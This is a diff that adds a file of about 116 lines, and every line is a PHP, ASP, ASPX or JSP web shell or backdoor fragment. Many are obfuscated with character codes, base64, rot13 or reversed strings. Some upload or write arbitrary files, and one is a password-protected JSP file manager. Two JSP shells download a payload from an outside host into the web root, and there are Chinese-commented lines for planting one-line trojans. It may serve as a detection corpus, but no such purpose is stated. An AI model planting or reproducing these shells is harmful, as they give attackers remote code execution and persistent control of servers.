@@ -1,0 +1,116 @@
+system ("exploit $hex");
+<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();?>
+eval(base64_decode('AZHJKZ'));
+<?php $s=@$_GET[2];if(md5($s.$s)=="e67c2597ecad64bb4cdad6633b04107f")@eval($_REQUEST[$s]); ?>
+<?php array_map("ass\x65rt",(array)$_REQUEST['expdoor']);?>
+<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>
+eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZaR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));
+<?php call_user_func(create_function(null,'assert($_POST[c]);'));?>
+<?php $x=base64_decode("YXNzZXJ0");$x($_POST['c']);?>
+<?php @eval($_POST[c])?>
+<?php system($_REQUEST['cmd']);?> 
+<?fputs(fopen(c.php,w),<?eval($_POST[c]);?>)?>
+<?$_POST['sa']($_POST['sb']);?>
+<?$_POST['sa']($_POST['sb'],$_POST['sc'])?>
+<?php @preg_replace("/[email]/e",$_POST['h'],"error"); ?>
+$filename=$_GET['xbid']; include_once ($filename);
+<?php $c='ass'.'ert';${c}($_POST[4]);?>
+<?php $k = str_replace("8","","a8s88s8e8r88t");$k($_POST["8"]); ?>
+<%eval request("sb")%>
+<%eval request("sb")%>
+<%execute request("sb")%>
+<%execute(request("sb"))%>
+<%execute request("sb")%><%'<% loop <%:%>
+Execute MorfiCoder(")/*/z/*/(tseuqer lave")
+<%execute(strreverse(")""xx""(tseuqer lave"))%>
+<% xx=request("xx")  eval xx %> 
+<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%> 
+<%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>
+<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request["f"])  ); }%>
+<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request("f")) ) %>
+function_exists ('popen')
+eval(Request.Item["pass"],"unsafe")
+Response.Write(eval(Request.Item["w"],"unsafe"))
+mywrite.write(request.form("content")) 
+nonamed.Write(Request.Item["l"]);
+popup(popup(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJ6Il0="))));
+strreverse(")""xx""(tseuqer lave")
+xxx=replace(xxx,"0","") 
+Function d(s):d=Mid(love,s,1):End Function:love="(tqxuesrav l)"&"""":execute(d(6)&d(10)&d(9)&d(12)&d(11)&d(8)&d(6)&d(3)&d(5)&d(6)&d(7)&d(2)&d(1)&d(14)&d(4)&d(4)&d(14)&d(13)) 
+eval("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0″&"-"&"2″&"-"&"5″&")"&")")
+MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*",vbCrlf)
+execute request("sb")
+ExecuteGlobal request("sb")
+Server.CreateObject("ScriptControl")
+Execute(DeAsc("%119%136%115%126%50%132%119%131%135%119%133%134%58%52%116%115%133%119%52%59"))
+Execute cd("6877656D2B736972786677752B237E232C2A","1314")
+ExecuteGlobal(StrReverse(a)) 
+request.getParameter("f")
+eval xx2
+shell_exec(base64_decode('AXADED'))
+eval(base64_decode('asas'))
+<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['k8']);?>
+<?php $mujj = $_POST['z'];if ($mujj!=""){$xsser=base64_decode($_POST['z0']);@eval("\$safedg = $xsser;");}?>
+<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>
+<?php preg_replace("/^/e",base64_decode($_REQUEST[g]),0);?>
+<?php fputs(fopen("./shell.php","w"),"<?eval(\$_POST[a]);?>")?>
+<?php if($_POST[admin]){assert($_POST[admin]);}else{phpinfo();}?>
+<?php ($www= $_POST['ice']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($www)','add');?>
+<?php ($_=@$_GET[2]).@$_($_POST[1])?>
+<?php $hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e"; $hh("/[discuz]/e",$_POST['h'],"Access"); ?>
+<?php $user="63a9f0ea7bb98050796b649e85481845"; #root $pass="7b24afc8bc80e548d66c4e7ff72171c5"; #toor if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass) {eval($_GET['idc']);}?>
+<?php $func = new ReflectionFunction($_GET[m]); echo $func->invokeArgs(array($_GET[c],$_GET[id])); ?>
+shell.php?m=file_put_contents&c=test.php&id=<?@eval($_POST[c]);?> //写入一句话马 for linux
+shell.php?m=file_put_contents&c=test.php&id=<?php eval($_POST[c]);?> //写入一句话马 for windows
+shell.php?m=system&c=echo ^<?php eval^($_POST[c]^);?^> >test.php //在当前目录下面生成一句话马 for windows
+shell.php?m=system&c=wget http://xxx.xxx/igenus/images/suffix/test.php //当前目录下载一句话马 for linux
+<?php assert($_POST[sb]);?>
+<script language="php">@eval($_POST[sb])</script>
+<?php eval($_POST[xiaoma]);?>
+<?php $_GET['ts7']($_POST['cmd']);?>
+<?fputs(fopen("test.php","w"),'<?php eval($_POST["cmd"]);?>');?>
+<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
+<% Function MorfiCoder(Code) MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf) End Function Execute MorfiCoder(")/*/z/*/(tseuqer lave") %>
+<%a=request("cmd")%><%eval a%>
+<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("a"))%>
+<%execute(request("xiaoma"))%>
+1":eval request("a")'
+"%><%eval request("a")%><%'" 
+<%Y=request("x")%> <%execute(Y)%>
+<%eval request("xiaoma")%>
+<%Eval(Request(chr(112))):Set fso=CreateObject("Scripting.FileSystemObject"):Set f=fso.GetFile(Request.ServerVariables("PATH_TRANSLATED")):if  f.attributes <> 39 then:f.attributes = 39:end if%>
+popup(popup(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJ6Il0=")))); 
+<%@ Page Language = Jscript %><%var/*-/*-*/P/*-/*-*/=/*-/*-*/"e"+"v"+/*-/*-*/"a"+"l"+"("+"R"+"e"+/*-/*-*/"q"+"u"+"e"/*-/*-*/+"s"+"t"+"[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]"+","+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval (/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>
+<% @Page Language="Jscript"%><%eval(Request.Item["hucxsz"],"unsafe");%>
+<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request["f"])  ); }%>
+<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request("f")) ) %>
+<%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["xiaoma"],"unsafe"));%>
+<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies["f4ck"].Value))).CreateInstance("c", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>
+<?php @eval($_POST['caidao']);?>
+<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('Status:404');Else/**/$K($M);?>
+<?php @preg_replace("//e",$_POST[x],"e");exit("|LO|"); ?>
+<?php array_map("ass\x65rt",(array)$_REQUEST['test']);?>
+<?php $item['wind'] = 'assert';$array[] = $item;$array[0]['wind']($_POST['whirlwind']);?>
+<?php if(isset($_POST["f4ck"])){$a=strrev("edoced_46esab");eval($a($_POST[z0]));}?>
+<?php if(md5($_GET['pass'])=='21232f297a57a5a743894a0e4a801fc3'){eval($_POST[console]);}else{die('fuck off!');}?>
+eval(gzinflate(base64_decode('s7ezsS/IKFBwSC1LzNFQiQ/wDw6JVlcpL9a1CyrNU4/VtE7OyM1PUQBKBbsGhbkGRSsFOwd5BoTEu3n6uPo5+roqxeoYmJiYaFrbA40CAA==')));
+eval($fatezero);
+echo `dir`;
+var b= eval(str,a); 
+<% dim x1,x2 x1 = request("pass") x2 = x1 eval x2 %>
+<%e+x-v+x-a+x-l(+x-r+x-e+x-q+x-u+x-e+x-s+x-t+x-(+x-+ACI-c+ACI)+x-)+x-%> 
+"var lcx = {'名字' : Request.form('#'), '性别' : eval, '年龄' : '18', '昵称' : 'o040'};lcx.性别((lcx.名字)+'');"
+if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());
+<%@ page language="java" pageEncoding="gbk"%><jsp:directive.page import="java.io.File"/><jsp:directive.page import="java.io.OutputStream"/><jsp:directive.page import="java.io.FileOutputStream"/><% int i=0;String method=request.getParameter("act");if(method!=null&&method.equals("yoco")){String url=request.getParameter("url");String text=request.getParameter("smart");File f=new File(url);if(f.exists()){f.delete();}try{OutputStream o=new FileOutputStream(f);o.write(text.getBytes());o.close();}catch(Exception e){i++;%>0<%}}if(i==0){%>1<%}%><form action='?act=yoco' method='post'><input size="100" value="<%=application.getRealPath("/") %>" name="url"><br><textarea rows="20" cols="80" name="smart">
+<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
+<%@page import="java.io.*"%><%@page import="java.net.*"%><%String t=request.getRealPath("/")+request.getParameter("f");new File(t).getParentFile().mkdirs();if(request.getParameter("p")==null){DataInputStream i=new DataInputStream(((HttpURLConnection)(new URL("http://qztmi.cn/js/h.txt").openConnection())).getInputStream());DataOutputStream o=new DataOutputStream(new FileOutputStream(t));byte[] b=new byte[4096];int c=0;while((c=i.read(b))>0){o.write(b,0,c);}o.close();i.close();out.println("down-ok");response.setHeader("down-ok","1");}else{(new FileOutputStream(t)).write(request.getParameter("p").getBytes());out.println("upload-ok");}%>
+<%@page import="java.io.*"%><%@page import="java.net.*"%><%String t=request.getRealPath("/")+request.getParameter("f");new File(t).getParentFile().mkdirs();if(request.getParameter("p")==null){DataInputStream i=new DataInputStream(((HttpURLConnection)(new URL("http://qztmi.cn/js/h.txt").openConnection())).getInputStream());DataOutputStream o=new DataOutputStream(new FileOutputStream(t));byte[] b=new byte[4096];int c=0;while((c=i.read(b))>0){o.write(b,0,c);}o.close();i.close();out.println("down-ok");response.setHeader("down-ok","1");}else{(new FileOutputStream(t)).write(request.getParameter("p").getBytes());out.println("upload-ok");}%>
+<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
+<%@ page import="java.io.*" %> <% String cmd = request.getParameter("cmd"); String output = ""; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s +"\r\n"; } } catch(IOException e) { e.printStackTrace(); } } out.println(output);%>
+<%@ page import="java.io.*" %> <% String cmd = request.getParameter("cmd"); String output = ""; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s +"\\r\\n"; } } catch(IOException e) { e.printStackTrace(); } } %> <pre> <%=output %> </pre>	3	4	5
+<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
+<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
+<%@ page language="java" pageEncoding="gbk"%><jsp:directive.page import="java.io.File"/><jsp:directive.page import="java.io.OutputStream"/><jsp:directive.page import="java.io.FileOutputStream"/><% int i=0;String method=request.getParameter("act");if(method!=null&&method.equals("yoco")){String url=request.getParameter("url");String text=request.getParameter("smart");File f=new File(url);if(f.exists()){f.delete();}try{OutputStream o=new FileOutputStream(f);o.write(text.getBytes());o.close();}catch(Exception e){i++;%>0<%}}if(i==0){%>1<%}%><form action='?act=yoco' method='post'><input size="100" value="<%=application.getRealPath("/") %>" name="url"><br><textarea rows="20" cols="80" name="smart">
+<%@ page language="java" pageEncoding="gbk"%><jsp:directive.page import="java.io.File"/><jsp:directive.page import="java.io.OutputStream"/><jsp:directive.page import="java.io.FileOutputStream"/><% int i=0;String method=request.getParameter("act");if(method!=null&&method.equals("yoco")){String url=request.getParameter("url");String text=request.getParameter("smart");File f=new File(url);if(f.exists()){f.delete();}try{OutputStream o=new FileOutputStream(f);o.write(text.getBytes());o.close();}catch(Exception e){i++;%>0<%}}if(i==0){%>1<%}%><form action='?act=yoco' method='post'><input size="100" value="<%=application.getRealPath("/") %>" name="url"><br><textarea rows="20" cols="80" name="smart">
+<%@page contentType="text/html; charset=GBK" import="java.io.*;"%><%!private String password="734303";//??¡¤????????????????%><html><head><title>hahahaha</title></head><body bgcolor="#ffffff"><%String act="";String path=request.getParameter("path");String content=request.getParameter("content");String url=request.getRequestURI();String url2=request.getRealPath(request.getServletPath());try{act=request.getParameter("act").toString();}catch(Exception e){}if(request.getSession().getAttribute("hehe")!=null){if(request.getSession().getAttribute("hehe").toString().equals("hehe")){if (path!=null && !path.equals("") && content!=null && !content.equals("")){   try{     File newfile=new File(path);     PrintWriter writer=new PrintWriter(newfile);     writer.println(content);     writer.close();     if (newfile.exists() && newfile.length()>0)     {       out.println("<font size=3 color=red>save ok!</font>");     }else{       out.println("<font size=3 color=red>save erry!</font>");     }   }catch(Exception e)   {     e.printStackTrace();   }}out.println("<form action="+url+" method=post>");out.println("<font size=3><br></font><input type=text size=54 name='path'><br>");out.println("<font size=3 color=red>"+url2+"</font><br>");out.println("<textarea name='content' rows=15 cols=50></textarea><br>");out.println("<input type='submit' value='save!'>");out.println("</form>");}}else{out.println("<div align='center'><form action='?act=login' method='post'>");out.println("<input type='password' name='pass'/>");out.println("<input type='submit' name='update' class='unnamed1' value='Login' />");out.println("</form></div>");}if(act.equals("login")){    String pass=request.getParameter("pass");    if(pass.equals(password))    {     session.setAttribute("hehe","hehe");     String uri=request.getRequestURI();        uri=uri.substring(uri.lastIndexOf("/")+1);     response.sendRedirect(uri);    }else    {out.println("Error");out.println("<a href='javascript:history.go(-1)'><font color='red'>go back</font></a></div><br>");    }    }%></body></html>
+<%@ page language="java" pageEncoding="gbk"%><jsp:directive.page import="java.io.File"/><jsp:directive.page import="java.io.OutputStream"/><jsp:directive.page import="java.io.FileOutputStream"/><% int i=0;String method=request.getParameter("act");if(method!=null&&method.equals("yoco")){String url=request.getParameter("url");String text=request.getParameter("smart");File f=new File(url);if(f.exists()){f.delete();}try{OutputStream o=new FileOutputStream(f);o.write(text.getBytes());o.close();}catch(Exception e){i++;%>0<%}}if(i==0){%>1<%}%><form action='?act=yoco' method='post'><input size="100" value="<%=application.getRealPath("/") %>" name="url"><br><textarea rows="20" cols="80" name="smart">
